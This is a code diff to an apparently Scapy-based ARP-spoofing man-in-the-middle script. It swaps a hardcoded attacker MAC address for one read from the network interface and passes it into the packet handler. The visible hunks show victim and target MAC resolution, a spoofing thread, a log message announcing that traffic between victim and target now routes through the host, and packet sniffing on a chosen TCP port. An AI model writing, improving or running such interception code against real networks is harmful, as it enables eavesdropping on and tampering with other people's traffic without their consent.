@@ -80,8 +80,8 @@ def restore_arp(iface, victim_ip, victim_mac, target_ip, target_mac):
         time.sleep(0.3)
 
 
-def handle_packet(pkt, port, log_file,mappings):
-    src = "00:0c:29:5d:1f:95" # TODO: Make this automatic rather than hard coded
+def handle_packet(pkt, port, log_file,mappings,own_mac):
+    src = own_mac
     dst = pkt[IP].dst 
 
     print("Source: "+src)
@@ -149,13 +149,14 @@ def main():
 
     try:
         conf.iface = args.interface
-        own_mac = get_if_hwaddr(args.interface) # interface mac address
     except Exception as e:
         log_line("[-] Error: "+str(e),log_file)
         exit(1)
 
+    own_mac = get_if_hwaddr(args.interface) # interface mac address
     victim_mac = get_mac(args.victim, args.interface)
     target_mac = get_mac(args.target, args.interface)
+
     if not victim_mac or not target_mac:
         print("Could not resolve MAC address for victim or target — aborting.", file=sys.stderr)
         sys.exit(1)
@@ -171,7 +172,7 @@ def main():
     spoof_thread.start()
     log_line("ARP spoofing started — traffic between victim and target now routes through this host.", log_file)
 
-    bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src 00:0c:29:5d:1f:95" # TODO: make MAC address whitelist automatic
+    bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src {own_mac}" # TODO: make MAC address whitelist automatic
 
     # bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target})"
 
@@ -179,7 +180,7 @@ def main():
     
     try:
         sniff(iface=args.interface, filter=bpf_filter,
-              prn=lambda p: handle_packet(p, args.port, log_file,mappings), store=False)
+              prn=lambda p: handle_packet(p, args.port, log_file,mappings,own_mac), store=False)
         # sniff(iface=args.interface,
         #       prn=lambda p: handle_packet(p, args.port, log_file), store=False)
     except KeyboardInterrupt:
